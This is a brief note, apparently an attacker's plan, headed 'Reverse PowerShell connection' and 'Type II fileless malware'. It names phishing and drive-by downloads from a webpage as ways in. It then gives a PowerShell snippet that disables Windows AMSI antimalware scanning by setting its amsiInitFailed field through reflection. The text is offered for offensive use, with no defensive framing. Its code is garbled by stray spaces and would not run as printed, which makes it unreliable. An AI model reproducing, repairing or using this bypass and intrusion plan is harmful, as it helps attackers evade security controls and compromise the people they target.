# Reverse PowerShell connection

## Type II fileless malware 
Execute/Injection 
- indirect file activity 
- point of entry still under progress but phishing works always 
- could hide on webpage and use drivebydownload if possible 

-----------
- amsi bypass may fail, use this: 
$w = 'System.Management.Automation.A'; $ c = 'si'; $ m = 'Utils'
$ assembly = [Ref] .Assembly.GetType (('{0} m {1} {2}' -f $ w, $ c, $ m))
$ field = $ assembly.GetField (('am {0} InitFailed' -f $ c), 'NonPublic, Static')
$ field.SetValue ($ null, $ true)
